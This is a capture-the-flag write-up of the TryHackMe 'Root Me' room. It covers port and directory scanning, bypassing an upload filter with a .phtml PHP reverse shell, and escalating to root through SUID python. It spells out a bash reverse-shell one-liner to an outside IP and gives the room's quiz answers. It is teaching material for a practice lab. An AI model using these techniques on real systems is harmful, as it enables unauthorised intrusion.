# TryHackMe - Root Me Room
<img width="545" alt="image" src="https://user-images.githubusercontent.com/114961392/207174227-7054a296-2acb-4e52-baec-7b688c7fd668.png">

## Reconnaissance
Let's scan all ports with nmap. Ports 22 (SSH) and 80 (HTTP) are open. Let's dig a little deeper using the service and script scans.  

<img width="479" alt="image" src="https://user-images.githubusercontent.com/114961392/207176246-18b759e5-ff1c-4d5f-97b0-4efc5c70319f.png">

Now I will use **dirsearch** (very similar to gobuster) to brute force any hidden directories.  

<img width="475" alt="image" src="https://user-images.githubusercontent.com/114961392/207178030-b81d7684-1cbc-4059-b033-abeaed1b2d4d.png">

This reveals 2 hidden directories called **/panel** and **/uploads**. The main web page has nothing interesting.  

<img width="556" alt="image" src="https://user-images.githubusercontent.com/114961392/207178431-c929bd32-2ed1-4762-8825-65bb3ca9688f.png">

Now let's look at the panel and uploads directories. Upon visiting the panel directory, we are presented with an upload page.  

<img width="451" alt="image" src="https://user-images.githubusercontent.com/114961392/207178940-2f85b96c-8acb-4a08-abc0-8e696b808130.png">

### Scan the machine, how many ports are open?  
2

### What version of Apache is running?
2.4.29

### What service is running on port 22?
SSH

### What is the hidden directory?
/panel

## Exploitation
It is safe to say that the uploads directory will hold the files that are uploaded through the panel directory. However we will confirm this.  
Now let's make a simple PHP script that we can upload and get a reverse shell.  

<img width="167" alt="image" src="https://user-images.githubusercontent.com/114961392/207180753-3b6b6915-d74a-4cd3-b010-d969da990924.png">

When I try to upload the PHP file, it comes back with an error.  

<img width="428" alt="image" src="https://user-images.githubusercontent.com/114961392/207180981-12077650-d64d-42df-a4cf-a9edd49fc1d2.png">

Looks like there is a filter on here which does not allow PHP. After researching **file upload bypass** as the hint indicates, [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload) has a useful page which tells us we can bypass the filter by changing the file extension. After a few attempts using different file extensions such as php2 and php3, they uploaded successfully however I could not get them to run. Eventually I found that the **phtml** file extension works.  

<img width="446" alt="image" src="https://user-images.githubusercontent.com/114961392/207183209-227d069c-c060-4762-aceb-6ca769f2a3a6.png">

After uploading the file with the extension phtml, I will use curl to activate the PHP file in the **/uploads** directory and run commands. This can also be done using **Burp Suite**.

<img width="328" alt="image" src="https://user-images.githubusercontent.com/114961392/207183504-cafdda8a-7475-4ef1-8c0e-0b23ffe2ebe4.png">

<img width="598" alt="image" src="https://user-images.githubusercontent.com/114961392/207190118-3195f651-4265-45bb-95b0-e62af36442ed.png">

The **id** command was successful so now let's try getting a reverse shell. I will replace the id command with a bash script to connect back to my machine. Remember to URL encode otherwise it will not work.    
**bash -c "bash -i >& /dev/tcp/10.4.2.215/9001 0>&1"**  

<img width="297" alt="image" src="https://user-images.githubusercontent.com/114961392/207192261-9c191a28-acfa-4c7a-96ea-4c54fc73dc5d.png">

Open up a netcat listener before running the command and you will catch the connection.  

<img width="404" alt="image" src="https://user-images.githubusercontent.com/114961392/207192547-65673010-de1e-4114-843a-b5c83955d6ed.png">

We can find the user flag in the /var/www/ directory.  

<img width="197" alt="image" src="https://user-images.githubusercontent.com/114961392/207193528-e8deda4c-6b93-4560-b3b5-ae5281d8ebe1.png">

## Privilege Escalation
Now to get to root, first let's upload **linpeas** to the target's tmp directory to find a vulnerable path. Before continuing, I will upgrade the terminal using for a more stable connection.  

<img width="407" alt="image" src="https://user-images.githubusercontent.com/114961392/207196319-c2c6da5e-a61f-45d2-ae20-704f79afbdb3.png">

After running linpeas, we can see that python has SUID permissions. We should be able to use this to escalate privileges.  

<img width="746" alt="image" src="https://user-images.githubusercontent.com/114961392/207196825-27d2b27f-0eb4-47fe-9b35-05d23d6e4628.png">

If we have a look at [GTFOBins](https://gtfobins.github.io/gtfobins/python/) in the python section, there is some commands to escalate privileges.  

<img width="622" alt="image" src="https://user-images.githubusercontent.com/114961392/207198575-3dfcf30f-7313-4c47-847a-a67970a02ac9.png">

I will use this and now we have root access and can capture the root flag.  

<img width="132" alt="image" src="https://user-images.githubusercontent.com/114961392/207198669-d4d2db9a-086c-47fc-b022-a1308dd405f6.png">
